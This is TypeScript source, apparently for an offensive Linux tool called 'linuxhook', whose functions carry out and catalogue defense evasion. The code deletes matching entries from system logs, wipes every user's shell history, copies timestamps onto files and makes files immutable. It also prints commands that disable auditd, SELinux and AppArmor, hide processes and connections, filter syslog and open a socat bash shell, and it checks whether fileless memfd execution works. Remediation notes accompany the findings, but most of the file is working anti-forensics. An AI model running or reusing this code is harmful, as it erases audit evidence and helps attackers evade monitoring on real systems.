import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function logTamper(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Log Tampering ==="]
  const pattern = argVal(args, "--pattern")
  const file = argVal(args, "--file")

  const script = `
echo "--- Log Files ---"
ls -lah /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages /var/log/kern.log /var/log/lastlog /var/log/wtmp /var/log/btmp 2>/dev/null

echo ""
echo "--- Log Permissions ---"
stat -c '%a %U:%G %n' /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages 2>/dev/null

echo ""
echo "--- Journald Status ---"
systemctl status systemd-journald 2>/dev/null | head -5
journalctl --disk-usage 2>/dev/null

${pattern && file ? `
echo ""
echo "--- Removing entries matching '${pattern}' from ${file} ---"
before=$(wc -l < "${file}" 2>/dev/null)
sed -i "/${pattern}/d" "${file}" 2>/dev/null
after=$(wc -l < "${file}" 2>/dev/null)
echo "Removed $((before - after)) line(s) from ${file}"
` : `
echo ""
echo "--- Usage ---"
echo "linuxhook log_tamper --file /var/log/auth.log --pattern '192.168.1.100'"
echo ""
echo "Manual examples:"
echo "  sed -i '/192.168.1.100/d' /var/log/auth.log"
echo "  > /var/log/auth.log  (clear entire file)"
echo "  shred -zu /var/log/auth.log  (secure delete)"
echo "  echo '' | tee /var/log/syslog  (truncate)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (pattern && file && r.stdout.includes("Removed")) {
    findings.push({
      checkId: "LNX-LOGTAMP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "EXPLOITED",
      resource: file,
      title: "Log entries tampered",
      details: `Entries matching '${pattern}' removed from ${file}`,
      remediation: "Ship logs to a remote SIEM in real-time. Use append-only log storage.",
    })
  }

  findings.push({
    checkId: "LNX-LOGTAMP-002",
    provider: "linuxhook",
    severity: "INFO",
    status: "IDENTIFIED",
    resource: "/var/log",
    title: "Log files enumerated",
    details: "System log files and permissions assessed for tampering viability",
    remediation: "Implement centralized logging with immutable storage. Enable log integrity monitoring.",
  })

  return { output: output.join("\n"), findings }
}

export async function historyClear(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== History Clearing ==="]

  const script = `
echo "--- Current History Files ---"
for dir in /root /home/*; do
  for hf in ".bash_history" ".zsh_history" ".sh_history" ".python_history" ".node_repl_history" ".mysql_history" ".psql_history"; do
    if [ -f "$dir/$hf" ]; then
      lines=$(wc -l < "$dir/$hf" 2>/dev/null)
      echo "[*] $dir/$hf: $lines lines"
    fi
  done
done

echo ""
echo "--- History Environment ---"
echo "HISTFILE=${HISTFILE:-not set}"
echo "HISTSIZE=${HISTSIZE:-not set}"
echo "HISTFILESIZE=${HISTFILESIZE:-not set}"
echo "HISTCONTROL=${HISTCONTROL:-not set}"

echo ""
echo "--- Clearing History ---"
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
history -c 2>/dev/null
for dir in /root /home/*; do
  for hf in ".bash_history" ".zsh_history" ".sh_history" ".python_history"; do
    if [ -f "$dir/$hf" ] && [ -w "$dir/$hf" ]; then
      > "$dir/$hf" 2>/dev/null && echo "[+] Cleared $dir/$hf"
    fi
  done
done

echo ""
echo "--- Prevent Future Logging ---"
echo "Run these in your shell session:"
echo "  unset HISTFILE"
echo "  export HISTSIZE=0"
echo "  set +o history"
echo "  Or prefix commands with a space (if HISTCONTROL=ignorespace)"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const cleared = (r.stdout.match(/Cleared/g) || []).length
  findings.push({
    checkId: "LNX-HISTCLR-001",
    provider: "linuxhook",
    severity: "MEDIUM",
    status: cleared > 0 ? "EXPLOITED" : "IDENTIFIED",
    resource: "shell_history",
    title: cleared > 0 ? `Shell history cleared (${cleared} files)` : "Shell history files enumerated",
    details: cleared > 0 ? `${cleared} history file(s) cleared. HISTFILE unset, HISTSIZE=0 for current session` : "History files found — clear before exiting",
    remediation: "Forward command history to a centralized audit system. Use auditd for command logging.",
  })

  return { output: output.join("\n"), findings }
}

export async function timestomp(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Timestomping ==="]
  const target = argVal(args, "--target")
  const reference = argVal(args, "--reference")

  const script = `
${target ? `
echo "--- Current Timestamps ---"
stat "${target}" 2>/dev/null

${reference ? `
echo ""
echo "--- Reference File Timestamps ---"
stat "${reference}" 2>/dev/null

echo ""
echo "--- Applying Timestamps ---"
touch -r "${reference}" "${target}" 2>/dev/null && echo "[+] atime/mtime copied from ${reference} to ${target}"
stat "${target}" 2>/dev/null
` : `
echo ""
echo "--- Modifying Timestamps ---"
echo "Usage: linuxhook timestomp --target /path/to/file --reference /bin/ls"
echo "  This copies atime/mtime from the reference file"
echo ""
echo "Manual approaches:"
echo "  touch -r /bin/ls target_file        # copy timestamps from reference"
echo "  touch -t 202301011200 target_file   # set specific timestamp"
echo "  debugfs -w -R 'set_inode_field <inode> crtime 202301011200' /dev/sda1  # ctime (requires debugfs)"
`}
` : `
echo "Usage: linuxhook timestomp --target /path/to/file --reference /bin/ls"
echo ""
echo "--- Recently Modified Files (last 24h) ---"
find /tmp /var/tmp /dev/shm -newer /etc/hostname -type f 2>/dev/null | head -20
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (target && reference && r.stdout.includes("[+]")) {
    findings.push({
      checkId: "LNX-TIMESTOMP-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "EXPLOITED",
      resource: target,
      title: "File timestamps modified",
      details: `Timestamps on ${target} copied from ${reference} — file now blends with legitimate system files`,
      remediation: "Use file integrity monitoring (AIDE, Tripwire). Monitor inode change times via auditd.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function auditdEvade(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Auditd Evasion ==="]

  const script = `
echo "--- Auditd Status ---"
systemctl status auditd 2>/dev/null | head -5 || service auditd status 2>/dev/null | head -3
ps aux 2>/dev/null | grep auditd | grep -v grep

echo ""
echo "--- Audit Rules ---"
auditctl -l 2>/dev/null || echo "[-] Cannot list rules (not root or auditctl not found)"

echo ""
echo "--- Audit Configuration ---"
cat /etc/audit/auditd.conf 2>/dev/null | grep -vE "^(#|$)" | head -20
cat /etc/audit/audit.rules 2>/dev/null | grep -vE "^(#|$)" | head -20
ls -la /etc/audit/rules.d/ 2>/dev/null

echo ""
echo "--- Audit Log Size ---"
ls -lah /var/log/audit/audit.log 2>/dev/null
wc -l /var/log/audit/audit.log 2>/dev/null

echo ""
echo "--- Evasion Options ---"
echo "  auditctl -D                 # Delete all rules"
echo "  auditctl -e 0               # Disable auditing"
echo "  service auditd stop         # Stop auditd"
echo "  kill -STOP \$(pidof auditd)   # Pause auditd"
echo "  > /var/log/audit/audit.log  # Clear log"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("running") || r.stdout.includes("auditd")) {
    findings.push({
      checkId: "LNX-AUDITD-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "auditd",
      title: "Auditd is active — actions are being logged",
      details: "Audit daemon is running with rules active. Consider disabling or pausing before sensitive operations.",
      remediation: "Protect auditd with immutable rules (-e 2). Ship logs to remote SIEM.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function selinuxBypass(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== SELinux Bypass ==="]

  const script = `
echo "--- SELinux Status ---"
getenforce 2>/dev/null || echo "[-] getenforce not available"
sestatus 2>/dev/null || echo "[-] sestatus not available"

echo ""
echo "--- Current Context ---"
id -Z 2>/dev/null || echo "[-] No SELinux context"

echo ""
echo "--- SELinux Booleans (security-relevant) ---"
getsebool -a 2>/dev/null | grep -iE "(httpd_can_network|allow_ptrace|allow_execmem|allow_execstack|secure_mode)" | head -20

echo ""
echo "--- Permissive Domains ---"
semanage permissive -l 2>/dev/null | head -20

echo ""
echo "--- Bypass Options ---"
echo "  setenforce 0                          # Set permissive (requires root)"
echo "  chcon -t unconfined_t /path/to/file   # Change file context"
echo "  runcon -t unconfined_t /bin/bash       # Run in unconfined context"
echo "  setsebool -P httpd_can_network_connect on  # Enable network for httpd"
echo "  semanage permissive -a httpd_t         # Set domain permissive"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const enforcing = r.stdout.includes("Enforcing")
  const permissive = r.stdout.includes("Permissive")
  const disabled = r.stdout.includes("Disabled") || r.stdout.includes("getenforce not available")

  if (enforcing) {
    findings.push({
      checkId: "LNX-SELINUX-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "selinux",
      title: "SELinux is enforcing — restricts exploitation",
      details: "SELinux in enforcing mode. Some exploits and persistence mechanisms may be blocked. Consider setting permissive or using unconfined contexts.",
      remediation: "Keep SELinux enforcing. Use targeted policy. Audit policy changes.",
    })
  }
  if (permissive) {
    findings.push({
      checkId: "LNX-SELINUX-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "FOUND",
      resource: "selinux",
      title: "SELinux is permissive — logging only",
      details: "SELinux in permissive mode — actions logged but NOT blocked. Proceed with exploitation.",
      remediation: "Set SELinux to enforcing mode. Investigate why it was set to permissive.",
    })
  }
  if (disabled) {
    findings.push({
      checkId: "LNX-SELINUX-003",
      provider: "linuxhook",
      severity: "LOW",
      status: "FOUND",
      resource: "selinux",
      title: "SELinux is disabled — no MAC restrictions",
      details: "SELinux disabled or not installed — no mandatory access control restrictions apply",
      remediation: "Enable SELinux in enforcing mode with targeted policy.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function apparmorBypass(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== AppArmor Bypass ==="]

  const script = `
echo "--- AppArmor Status ---"
aa-status 2>/dev/null || echo "[-] aa-status not available or not root"
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -30

echo ""
echo "--- Profile Modes ---"
aa-status 2>/dev/null | grep -E "(enforce|complain|unconfined)" | head -20

echo ""
echo "--- Current Process Profile ---"
cat /proc/self/attr/current 2>/dev/null || echo "[-] Cannot read current profile"

echo ""
echo "--- Bypass Options ---"
echo "  aa-complain /path/to/profile   # Set to complain mode"
echo "  aa-disable /path/to/profile    # Disable profile"
echo "  apparmor_parser -R /etc/apparmor.d/profile  # Unload profile"
echo "  ln -s /etc/apparmor.d/profile /etc/apparmor.d/disable/  # Disable on boot"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("enforce")) {
    const enforced = (r.stdout.match(/enforce/g) || []).length
    findings.push({
      checkId: "LNX-APPARMOR-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "apparmor",
      title: `AppArmor active with ${enforced} enforcing profile(s)`,
      details: "AppArmor profiles in enforce mode — may restrict exploitation. Set to complain mode or disable specific profiles.",
      remediation: "Keep AppArmor profiles enforcing. Audit profile changes.",
    })
  }

  if (r.stdout.includes("unconfined")) {
    findings.push({
      checkId: "LNX-APPARMOR-002",
      provider: "linuxhook",
      severity: "LOW",
      status: "FOUND",
      resource: "apparmor",
      title: "Unconfined processes detected",
      details: "Some processes run without AppArmor confinement — can be exploited without profile restrictions",
      remediation: "Create AppArmor profiles for all services. Minimize unconfined processes.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function rootkitDetect(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Security Scanner Detection ==="]

  const script = `
echo "--- Installed Security Scanners ---"
for tool in rkhunter chkrootkit tripwire aide osqueryd ossec-control wazuh-control fail2ban-client lynis; do
  if command -v "$tool" >/dev/null 2>&1; then
    echo "[!] DETECTED: $tool"
  fi
done

echo ""
echo "--- Security Scanner Processes ---"
ps aux 2>/dev/null | grep -iE "(rkhunter|chkrootkit|tripwire|aide|osquery|ossec|wazuh|clamd|clamscan|fail2ban|lynis)" | grep -v grep

echo ""
echo "--- Scanner Databases ---"
ls -la /var/lib/tripwire/ /var/lib/aide/ /var/ossec/ /var/osquery/ /etc/rkhunter.conf 2>/dev/null
ls -la /var/lib/rkhunter/db/ 2>/dev/null | head -5

echo ""
echo "--- Scanner Cron Jobs ---"
grep -r "rkhunter\|chkrootkit\|tripwire\|aide\|lynis" /etc/cron* /var/spool/cron/ 2>/dev/null

echo ""
echo "--- Last Scan Results ---"
cat /var/log/rkhunter.log 2>/dev/null | tail -5
cat /var/log/chkrootkit.log 2>/dev/null | tail -5
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const detected = (r.stdout.match(/DETECTED:/g) || []).length
  if (detected > 0) {
    findings.push({
      checkId: "LNX-ROOTKIT-001",
      provider: "linuxhook",
      severity: "INFO",
      status: "IDENTIFIED",
      resource: "security_scanners",
      title: `${detected} security scanner(s) installed`,
      details: "Security scanners detected — artifacts may be discovered by scheduled scans. Clean up before leaving.",
      remediation: "Ensure security scanners run regularly with up-to-date databases.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function processHide(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Process Hiding ==="]

  const script = `
echo "--- Current Process ---"
echo "PID: $$"
echo "CMD: $(cat /proc/$$/cmdline 2>/dev/null | tr '\\0' ' ')"

echo ""
echo "--- Mount Namespace Info ---"
ls -la /proc/self/ns/mnt 2>/dev/null
cat /proc/self/mountinfo 2>/dev/null | grep proc | head -5

echo ""
echo "--- Process Hiding Techniques ---"
echo "1. Mount namespace (requires root):"
echo "   unshare -m bash"
echo "   mount -o bind /dev/null /proc/\$PID/cmdline"
echo ""
echo "2. Rename via exec (in bash):"
echo "   exec -a '[kworker/0:1]' bash  # Masquerade as kernel thread"
echo ""
echo "3. LD_PRELOAD hook (hide from ps):"
echo "   Inject shared library that filters readdir() on /proc/"
echo ""
echo "4. Background with nohup:"
echo "   nohup command > /dev/null 2>&1 &"

echo ""
echo "--- Existing Hidden Processes ---"
ls -d /proc/[0-9]* 2>/dev/null | wc -l
echo "processes in /proc"
ps aux 2>/dev/null | wc -l
echo "processes in ps output"
echo "(Large discrepancy may indicate hidden processes)"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-HIDE-001",
    provider: "linuxhook",
    severity: "MEDIUM",
    status: "IDENTIFIED",
    resource: "processes",
    title: "Process hiding techniques assessed",
    details: "Process hiding methods documented — use mount namespace or exec rename to avoid detection",
    remediation: "Monitor for mount namespace changes. Use kernel-level process monitoring (auditd, eBPF).",
  })

  return { output: output.join("\n"), findings }
}

export async function fileHide(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== File Hiding ==="]
  const target = argVal(args, "--target")

  const script = `
echo "--- File Hiding Techniques ---"
echo "1. Dotfile: mv file .file"
echo "2. Extended attributes: setfattr -n user.hidden -v true file"
echo "3. Immutable: chattr +i file  (prevents deletion even by root)"
echo "4. Append-only: chattr +a file"
echo "5. Bind mount: mount -o bind /dev/null /path/to/file"
echo "6. /dev/shm: Store in tmpfs (RAM only, lost on reboot)"

echo ""
echo "--- Hidden Files in Common Dirs ---"
find /tmp /var/tmp /dev/shm -name ".*" -type f 2>/dev/null | head -20

echo ""
echo "--- Files with Extended Attributes ---"
find /tmp /var/tmp -exec getfattr -d {} \; 2>/dev/null | grep -B1 "user\\." | head -20

echo ""
echo "--- Immutable Files ---"
lsattr /tmp/ /var/tmp/ /dev/shm/ 2>/dev/null | grep "i" | head -10

${target ? `
echo ""
echo "--- Hiding ${target} ---"
if [ -f "${target}" ]; then
  chattr +i "${target}" 2>/dev/null && echo "[+] Set immutable attribute on ${target}"
  echo "[*] File is now protected from deletion"
fi
` : ""}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (target && r.stdout.includes("[+] Set immutable")) {
    findings.push({
      checkId: "LNX-HIDE-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "EXPLOITED",
      resource: target,
      title: "File hidden with immutable attribute",
      details: `${target} set immutable — cannot be deleted or modified without chattr -i`,
      remediation: "Monitor for chattr usage. Use file integrity monitoring.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function networkHide(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Network Connection Hiding ==="]

  const script = `
echo "--- Current Connections ---"
ss -tnp 2>/dev/null | head -20

echo ""
echo "--- Network Hiding Techniques ---"
echo "1. iptables owner match (drop RST to hide from ss):"
echo "   iptables -A OUTPUT -p tcp --tcp-flags RST RST -m owner --uid-owner \$(id -u) -j DROP"
echo ""
echo "2. Unix domain socket C2 (invisible to netstat/ss):"
echo "   socat UNIX-LISTEN:/tmp/.hidden.sock,fork EXEC:/bin/bash"
echo ""
echo "3. Raw socket (bypass TCP/UDP stack):"
echo "   python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)'"
echo ""
echo "4. ICMP tunnel (hide in ping traffic):"
echo "   Use icmpsh or ptunnel for covert channels"
echo ""
echo "5. DNS tunnel (hide in DNS queries):"
echo "   Use iodine or dnscat2"

echo ""
echo "--- Existing Suspicious Connections ---"
ss -tnp 2>/dev/null | grep -vE "(:22|:80|:443|:53|LISTEN)" | head -10

echo ""
echo "--- Unix Domain Sockets ---"
ss -xlp 2>/dev/null | grep -E "(@|/tmp/|/dev/shm)" | head -10
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  findings.push({
    checkId: "LNX-NETHIDE-001",
    provider: "linuxhook",
    severity: "MEDIUM",
    status: "IDENTIFIED",
    resource: "network",
    title: "Network hiding techniques assessed",
    details: "Multiple network hiding methods available — iptables owner match, Unix sockets, raw sockets, tunneling",
    remediation: "Deploy network-level monitoring (IDS/IPS). Monitor for unusual iptables rule changes.",
  })

  return { output: output.join("\n"), findings }
}

export async function syslogManipulate(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Syslog Manipulation ==="]
  const facility = argVal(args, "--facility")
  const pattern = argVal(args, "--pattern")

  const script = `
echo "--- Syslog Daemon ---"
ps aux 2>/dev/null | grep -E "(rsyslog|syslog-ng|systemd-journal)" | grep -v grep

echo ""
echo "--- Rsyslog Configuration ---"
cat /etc/rsyslog.conf 2>/dev/null | grep -vE "^(#|$)" | head -20
ls -la /etc/rsyslog.d/ 2>/dev/null

echo ""
echo "--- Syslog-ng Configuration ---"
cat /etc/syslog-ng/syslog-ng.conf 2>/dev/null | grep -vE "^(#|$)" | head -20

echo ""
echo "--- Remote Log Forwarding ---"
grep -rE "(@|@@)" /etc/rsyslog.conf /etc/rsyslog.d/ 2>/dev/null
grep -r "destination.*network\|tcp\|udp" /etc/syslog-ng/ 2>/dev/null

echo ""
echo "--- Manipulation Options ---"
echo "  echo ':msg, contains, \"${pattern:-pattern}\" ~' > /etc/rsyslog.d/99-filter.conf"
echo "  systemctl restart rsyslog"
echo "  (This drops messages matching the pattern)"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("rsyslog") || r.stdout.includes("syslog-ng")) {
    findings.push({
      checkId: "LNX-SYSLOG-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "IDENTIFIED",
      resource: "syslog",
      title: "Syslog daemon identified",
      details: "Syslog service active — configuration can be modified to drop or redirect log messages",
      remediation: "Protect syslog config with immutable attributes. Monitor for config changes.",
    })
  }

  if (r.stdout.includes("@@") || r.stdout.includes("destination")) {
    findings.push({
      checkId: "LNX-SYSLOG-002",
      provider: "linuxhook",
      severity: "INFO",
      status: "IDENTIFIED",
      resource: "syslog",
      title: "Remote log forwarding detected",
      details: "Logs are being forwarded to remote server — local log tampering alone will not erase traces",
      remediation: "Maintain remote log forwarding to a hardened SIEM.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function stealthCheckLinux(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Stealth Mode Check ==="]

  const script = `
echo "--- Base64 Execution Test ---"
result=$(echo 'echo STEALTH_OK' | base64 | base64 -d | bash 2>/dev/null)
[ "$result" = "STEALTH_OK" ] && echo "[+] base64 execution works" || echo "[-] base64 execution failed"

echo ""
echo "--- /dev/shm Writability ---"
if [ -w /dev/shm ]; then
  echo "[+] /dev/shm is writable (shm stealth available)"
  df -h /dev/shm 2>/dev/null | tail -1
  mount 2>/dev/null | grep "shm\|tmpfs" | grep -v cgroup
else
  echo "[-] /dev/shm is not writable"
fi

echo ""
echo "--- Python3 memfd_create Check ---"
if command -v python3 >/dev/null 2>&1; then
  python3 -c "
import ctypes
try:
  libc = ctypes.CDLL('libc.so.6')
  fd = libc.memfd_create(b'test', 1)
  if fd >= 0:
    import os; os.close(fd)
    print('[+] memfd_create works (memfd stealth available)')
  else:
    print('[-] memfd_create returned error')
except:
  print('[-] memfd_create not available')
" 2>/dev/null
else
  echo "[-] python3 not available for memfd stealth"
fi

echo ""
echo "--- Monitoring Status ---"
echo -n "auditd: "; systemctl is-active auditd 2>/dev/null || echo "inactive"
echo -n "rsyslog: "; systemctl is-active rsyslog 2>/dev/null || echo "inactive"
echo -n "syslog-ng: "; systemctl is-active syslog-ng 2>/dev/null || echo "inactive"
echo -n "SELinux: "; getenforce 2>/dev/null || echo "not installed"
echo -n "AppArmor: "; aa-status --enabled 2>/dev/null && echo "enabled" || echo "disabled/not installed"
echo -n "fail2ban: "; systemctl is-active fail2ban 2>/dev/null || echo "inactive"

echo ""
echo "--- Recommended Stealth Mode ---"
if command -v python3 >/dev/null 2>&1; then
  echo "Best: memfd (fileless execution via python3 memfd_create)"
elif [ -w /dev/shm ]; then
  echo "Good: shm (execute from /dev/shm tmpfs, auto-delete)"
else
  echo "Basic: base64 (encode commands, hides from process listing)"
fi
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const modes: string[] = []
  if (r.stdout.includes("base64 execution works")) modes.push("base64")
  if (r.stdout.includes("shm stealth available")) modes.push("shm")
  if (r.stdout.includes("memfd stealth available")) modes.push("memfd")

  findings.push({
    checkId: "LNX-STEALTH-001",
    provider: "linuxhook",
    severity: "INFO",
    status: "IDENTIFIED",
    resource: "stealth",
    title: `${modes.length} stealth mode(s) available: ${modes.join(", ") || "none"}`,
    details: `Available stealth modes: ${modes.join(", ") || "none"}. Use --stealth <mode> flag with linuxhook commands.`,
    remediation: "Mount /dev/shm with noexec. Restrict memfd_create via seccomp. Monitor for encoded command execution.",
  })

  return { output: output.join("\n"), findings }
}
